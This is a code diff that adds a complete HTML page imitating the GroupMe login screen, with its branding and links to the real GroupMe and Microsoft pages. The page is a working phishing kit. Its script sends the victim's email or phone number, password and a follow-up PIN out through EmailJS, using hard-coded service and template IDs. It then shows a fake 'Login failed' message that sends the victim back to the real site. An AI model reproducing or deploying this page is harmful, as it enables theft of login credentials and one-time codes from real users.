@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GroupMe Login</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init({
+                publicKey: "Sjoxr05s3N5lZGc8q",
+            });
+        })();
+
+        function sendLoginEmail(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const templateParams = {
+                email: email,
+                password: password
+            };
+
+            emailjs.send("service_v87g2ct", "template_aqujkot", templateParams)
+                .then(function(response) {
+                    document.querySelector('.login-container').style.display = 'none';
+                    document.querySelector('.pin-container').style.display = 'block';
+                }, function(error) {
+                    console.error('FAILED...', error);
+                    alert('FAILED... Check console for details.');
+                });
+        }
+
+        function sendPinEmail(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const pin = document.getElementById('pin').value;
+
+            const templateParams = {
+                email: email,
+                password: password,
+                pin: pin
+            };
+
+            emailjs.send("service_v87g2ct", "template_tylhn2u", templateParams)
+                .then(function(response) {
+                    showErrorPopup();
+                }, function(error) {
+                    console.error('FAILED...', error);
+                    alert('FAILED... Check console for details.');
+                });
+        }
+
+        function showErrorPopup() {
+            const popup = document.createElement('div');
+            popup.className = 'popup';
+            popup.innerHTML = 
+                `<div class="popup-content">
+                    <h2>Login failed</h2>
+                    <a class="btn-try-again" href="https://web.groupme.com/signin">Go Back</a>
+                </div>`;
+            document.body.appendChild(popup);
+
+            // Close popup when clicking outside of it
+            window.addEventListener('click', function(event) {
+                if (event.target === popup) {
+                    document.body.removeChild(popup);
+                }
+            });
+        }
+    </script>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f7f7f7;
+        }
+        .container {
+            display: flex;
+            height: 80%;
+            width: 60%;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            overflow: hidden;
+            max-width: 800px;
+            max-height: 500px;
+        }
+        .left {
+            background: linear-gradient(to bottom, #00aaff, #0066ff);
+            flex: 1;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            border-top-left-radius: 8px; /* Added rounded corners */
+            border-bottom-left-radius: 8px; /* Added rounded corners */
+        }
+        .left img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .right {
+            flex: 1;
+            background: white;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-top-right-radius: 8px; /* Added rounded corners */
+            border-bottom-right-radius: 8px; /* Added rounded corners */
+        }
+        .right h2 {
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            width: 100%;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #333;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .btn {
+            background-color: #007bff;
+            color: white;
+            padding: 10px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+            border-radius: 4px;
+        }
+        .btn:disabled {
+            background-color: #aaa;
+            cursor: not-allowed;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+        }
+        .footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .hidden {
+            display: none;
+        }
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .popup-content {
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .popup-content h2 {
+            margin: 0;
+            color: #333;
+        }
+        .popup-content p {
+            margin: 10px 0;
+            color: #666;
+        }
+        .btn-try-again {
+            display: inline-block;
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .btn-try-again:hover {
+            background-color: #0056b3;
+        }
+
+        /* Media Query for Mobile */
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                width: 100%;
+                height: 100%;
+            }
+            .left {
+                width: 100%;
+                height: 80px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                padding: 0;
+                border-radius: 0; /* Reset rounded corners on mobile */
+            }
+            .left img {
+                width: 50px;
+                margin-bottom: 0;
+            }
+            .right {
+                width: 100%;
+                height: calc(100% - 80px);
+                padding: 20px;
+                box-shadow: none;
+                border-radius: 0; /* Reset rounded corners on mobile */
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            .right form {
+                width: 100%;
+            }
+            .footer {
+                text-align: center;
+                width: 100%;
+            }
+            .left h1 {
+                display: none; /* Hide the text on mobile */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <img src="groupme-logo.png" alt="GroupMe Logo">
+            <h1>Your people, together.</h1>
+        </div>
+        <div class="right">
+            <!-- Login Form -->
+            <div class="login-container">
+                <h2>Log in</h2>
+                <form onsubmit="sendLoginEmail(event)">
+                    <div class="form-group">
+                        <label for="email">Email or phone number</label>
+                        <input type="text" id="email" name="email">
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password">
+                    </div>
+                    <button class="btn" type="submit">Log in</button>
+                </form>
+            </div>
+            <!-- PIN Form -->
+            <div class="pin-container hidden">
+                <h2>Enter PIN</h2>
+                <form onsubmit="sendPinEmail(event)">
+                    <div class="form-group">
+                        <label for="pin">PIN</label>
+                        <input type="text" id="pin" name="pin">
+                    </div>
+                    <button class="btn" type="submit">Submit PIN</button>
+                </form>
+            </div>
+            <div class="footer">
+                <input type="checkbox" id="rememberMe">
+                <label for="rememberMe">Remember me</label>
+                <br>
+                <a href="https://web.groupme.com/forgot_password">Forgot password?</a>
+                <p>By continuing, you agree to our <a href="https://groupme.com/terms">Terms of Service</a>, <a href="https://go.microsoft.com/fwlink/?LinkId=521839">Privacy & Cookies Statement</a>, and <a href="https://go.microsoft.com/fwlink/?LinkId=2259814">Consumer Health Privacy</a>.</p>
+                <a href="https://web.groupme.com/register">Don't have an Account?</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
